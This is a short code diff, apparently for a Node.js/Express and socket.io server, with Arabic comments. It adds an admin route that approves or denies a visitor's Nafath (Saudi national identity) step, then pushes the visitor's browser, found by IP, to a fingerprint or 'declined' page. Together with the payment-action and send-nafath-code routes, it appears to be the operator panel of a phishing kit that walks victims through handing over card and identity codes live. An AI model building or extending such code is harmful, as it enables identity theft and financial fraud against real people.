@@ -729,6 +729,34 @@ app.post("/api/admin/payment-action", authMiddleware, (req, res) => {
   }
 });
 
+// قبول/رفض النفاذ
+app.post("/api/admin/nafath-action", authMiddleware, (req, res) => {
+  try {
+    const { reference, action } = req.body;
+    if (!reference || !action) return res.status(400).json({ error: "البيانات ناقصة" });
+    let clientIp = null;
+    for (const [ip, ref] of ipToReference.entries()) {
+      if (ref === reference) { clientIp = ip; break; }
+    }
+    let targetPage = null;
+    if (action === "pass") {
+      targetPage = "nafadBasmah";
+      createOrUpdateVerification(reference, "nafath", { step: 2, status: "approved" });
+    } else if (action === "denied") {
+      targetPage = "nafad?declined=true";
+      createOrUpdateVerification(reference, "nafath", { step: 1, status: "denied" });
+    }
+    if (targetPage && clientIp) {
+      io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
+      io.emit("navigateTo", { page: targetPage, ip: clientIp });
+    }
+    io.to("admins").emit("paymentActionSet", { reference, action });
+    res.json({ success: true, action, reference, targetPage });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // إرسال رمز نفاذ
 app.post("/api/admin/send-nafath-code", authMiddleware, (req, res) => {
   try {
